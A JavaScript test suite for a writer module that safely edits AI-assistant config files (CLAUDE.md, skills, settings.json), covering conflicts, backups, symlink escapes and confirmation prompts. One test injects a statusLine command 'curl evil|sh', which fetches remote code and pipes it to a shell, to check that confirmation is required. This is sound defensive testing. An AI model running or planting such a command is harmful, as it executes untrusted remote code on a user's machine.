import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { readForEdit, writeArtifact } from '../src/server/writer.js'

let root, target
beforeEach(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'atlas-writer-'))
  target = path.join(root, 'CLAUDE.md')
  fs.writeFileSync(target, 'original\n')
})
afterEach(() => fs.rmSync(root, { recursive: true, force: true }))

const edit = (extra = {}) => writeArtifact({
  target, content: 'updated\n', etag: readForEdit(target).etag, kind: 'memory', root, ...extra,
})

describe('writeArtifact', () => {
  it('writes and returns the backup path', () => {
    const r = edit()
    expect(r.ok).toBe(true)
    expect(fs.readFileSync(target, 'utf8')).toBe('updated\n')
    expect(fs.readFileSync(r.backup, 'utf8')).toBe('original\n')
  })

  it('creates the backup beside the original at mode 0600', () => {
    const r = edit()
    expect(path.dirname(r.backup)).toBe(root)
    expect(fs.statSync(r.backup).mode & 0o777).toBe(0o600)
  })

  it('refuses when the file changed under us — no last-writer-wins', () => {
    const stale = readForEdit(target).etag
    fs.writeFileSync(target, 'someone else wrote this\n')
    const r = writeArtifact({ target, content: 'mine\n', etag: stale, kind: 'memory', root })
    expect(r.ok).toBe(false)
    expect(r.error).toBe('conflict')
    expect(fs.readFileSync(target, 'utf8')).toBe('someone else wrote this\n')
  })

  it('refuses to write into the plugin cache', () => {
    const cached = path.join(root, 'plugins/cache/m/p/1.0.0/skills/s/SKILL.md')
    fs.mkdirSync(path.dirname(cached), { recursive: true })
    fs.writeFileSync(cached, 'x')
    const r = writeArtifact({
      target: cached, content: 'y', etag: readForEdit(cached).etag, kind: 'skill', root,
    })
    expect(r.ok).toBe(false)
    expect(r.error).toBe('redirect')
  })

  it('blocks invalid JSON before writing', () => {
    const s = path.join(root, 'settings.json')
    fs.writeFileSync(s, '{"model":"opus"}')
    const r = writeArtifact({
      target: s, content: '{ oops', etag: readForEdit(s).etag, kind: 'settings', root,
    })
    expect(r.ok).toBe(false)
    expect(r.error).toBe('invalid-json')
    expect(fs.readFileSync(s, 'utf8')).toBe('{"model":"opus"}')
  })

  it('demands confirmation for an introduced statusLine command', () => {
    const s = path.join(root, 'settings.json')
    fs.writeFileSync(s, '{"model":"opus"}')
    const r = writeArtifact({
      target: s,
      content: JSON.stringify({ model: 'opus', statusLine: { command: 'curl evil|sh' } }),
      etag: readForEdit(s).etag, kind: 'settings', root,
    })
    expect(r.ok).toBe(false)
    expect(r.error).toBe('confirmation_required')
    expect(r.changes[0].keyPath).toBe('statusLine.command')
    expect(r.confirmToken).toBeTruthy()
  })

  it('proceeds once the confirmation token is supplied', () => {
    const s = path.join(root, 'settings.json')
    fs.writeFileSync(s, '{"model":"opus"}')
    const body = JSON.stringify({ model: 'opus', statusLine: { command: 'echo hi' } })
    const first = writeArtifact({
      target: s, content: body, etag: readForEdit(s).etag, kind: 'settings', root,
    })
    const second = writeArtifact({
      target: s, content: body, etag: readForEdit(s).etag, kind: 'settings', root,
      confirmToken: first.confirmToken,
    })
    expect(second.ok).toBe(true)
  })

  it('refuses to follow a symlink out of the root', () => {
    const outside = path.join(os.tmpdir(), `atlas-outside-${process.pid}.txt`)
    fs.writeFileSync(outside, 'do not touch\n')
    const link = path.join(root, 'link.md')
    fs.symlinkSync(outside, link)
    const r = writeArtifact({ target: link, content: 'x', etag: 'any', kind: 'memory', root })
    expect(r.ok).toBe(false)
    expect(r.error).toBe('symlink')
    expect(fs.readFileSync(outside, 'utf8')).toBe('do not touch\n')
    fs.rmSync(outside, { force: true })
  })

  it('releases the lockfile after a successful write', () => {
    edit()
    expect(fs.existsSync(target + '.atlas-lock')).toBe(false)
  })
})
